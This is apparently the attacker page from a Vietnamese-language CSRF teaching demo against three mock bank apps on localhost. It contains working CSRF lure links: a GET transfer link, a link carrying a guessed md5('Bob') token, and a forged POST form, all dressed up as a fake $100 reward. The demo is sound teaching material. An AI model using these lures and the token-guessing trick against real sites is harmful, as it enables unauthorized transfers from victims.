<?php
// Kẻ tấn công tính toán token yếu của Bank 2
$victim_user = "Bob";
// Do Bank 2 dùng md5("Bob") để sinh token, kẻ tấn công tính trước:
$guess_token = md5($victim_user); 
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Trang Web Độc Hại - CSRF Chủ Động</title>
    <style>
        /* Giữ nguyên CSS của bạn */
        body { font-family: Arial, sans-serif; background-color: #f8f8f8; padding: 40px; color: #333; }
        .container { max-width: 700px; margin: 0 auto; background-color: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); border-left: 5px solid #cc0000; }
        h1 { color: #cc0000; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 20px; }
        h2 { color: #555; font-size: 1.2em; margin-top: 25px; }
        p { margin-bottom: 15px; line-height: 1.6; }
        .action-link { display: inline-block; padding: 10px 15px; border-radius: 4px; text-decoration: none; font-weight: bold; margin-top: 10px; }
        .success-action a { background-color: #4CAF50; color: white; border: none; }
        .failure-action button { background-color: #9E9E9E; color: white; border: none; padding: 10px 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Trang Web Độc Hại (Yêu cầu Tương Tác)</h1>
        <p>Tham gia ngay sự kiện đặc biệt này. Vui lòng **Click** để xác minh tài khoản và nhận ưu đãi!</p>

        <hr>

        <div class="success-action">
            <h2>1. Tấn công Ngân hàng 1 (Lỗ hổng GET)</h2>
            <p><strong>Kỹ thuật:</strong> Lợi dụng GET, yêu cầu người dùng Click.</p>
            <a class="action-link" href="http://localhost/csrf_demo2/bank1.php?transfer=1">Click để nhận MÃ THƯỞNG 100$ (Dự kiến: THÀNH CÔNG)</a>
        </div>

        <div class="success-action">
            <h2>2. Tấn công Ngân hàng 2 (Token Yếu - Đã đoán được)</h2>
            <p><strong>Kỹ thuật:</strong> Link GET chứa token tính toán trước (<code><?php echo htmlspecialchars($guess_token); ?></code>).</p>
            <a class="action-link" href="http://localhost/csrf_demo2/bank2.php?token=<?php echo htmlspecialchars($guess_token); ?>">
                Click để XÁC MINH CHUYỂN KHOẢN (Dự kiến: THÀNH CÔNG)
            </a>
        </div>

        <div class="failure-action">
            <h2>3. Thử tấn công Ngân hàng 3 (POST - Bị chặn)</h2>
            <p><strong>Kỹ thuật:</strong> Tấn công bằng phương thức POST với token giả mạo ("BADTOKEN").</p>
            <form action="http://localhost/csrf_demo2/bank3.php" method="post">
                <input type="hidden" name="token" value="BADTOKEN">
                <button type="submit">Nhấn để hoàn tất giao dịch (Dự kiến: THẤT BẠI)</button>
            </form>
        </div>
    </div>
</body>
</html>